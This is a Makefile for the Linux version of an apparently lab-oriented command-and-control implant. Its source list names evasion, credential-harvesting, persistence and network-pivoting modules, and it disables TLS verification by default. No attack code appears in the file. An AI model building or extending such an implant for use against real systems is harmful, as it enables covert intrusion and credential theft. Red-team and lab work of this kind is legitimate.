# Jager-C2 Linux Implant - native ELF build (see implant-linux/ for sources)
# Windows implant lives in ../implant/ — do not add platform stubs there.
CC = gcc
LAB_NO_TLS_VERIFY ?= 1
DEFINES = $(if $(filter 1,$(LAB_NO_TLS_VERIFY)),-DLAB_NO_TLS_VERIFY,)
CFLAGS = -Wall -Os -s -DLINUX_IMPLANT -Iinclude $(DEFINES)
LDFLAGS = -lcurl -lssl -lcrypto -lpthread -ldl -Wl,--gc-sections
LDFLAGS_COMPAT = -lcurl -lssl -lcrypto -lpthread -ldl -Wl,--gc-sections

CORE_SRC = src/core/beacon.c \
           src/core/transport.c \
           src/core/transport_failover.c \
           src/core/tasks.c \
           src/core/process.c \
           src/core/malleable.c

UTIL_SRC = src/util/json.c \
           src/util/json_emit.c \
           src/util/base64.c \
           src/util/crypto.c \
           src/util/random.c

EVASION_SRC = src/evasion/anti_analysis.c \
              src/evasion/process.c \
              src/evasion/sleep_encrypt.c

POSTEX_SRC = src/postex/credentials.c \
             src/postex/discovery.c \
             src/postex/persistence.c \
             src/postex/auto_enum.c \
             src/postex/screenshot.c

EXEC_SRC = src/execution/module_loader.c

FS_SRC = src/filesystem/fs.c

PIVOT_SRC = src/pivot/socks.c \
            src/pivot/tunnel.c \
            src/pivot/portfwd.c \
            src/pivot/p2p.c

SOURCES = $(CORE_SRC) $(UTIL_SRC) $(EVASION_SRC) $(POSTEX_SRC) $(FS_SRC) $(PIVOT_SRC) $(EXEC_SRC)

TARGET = bin/implant-linux

.PHONY: all clean

all: $(TARGET)

bin:
	mkdir -p bin

$(TARGET): $(SOURCES) | bin
	$(CC) $(CFLAGS) -o $@ $(SOURCES) $(LDFLAGS)

clean:
	rm -rf bin
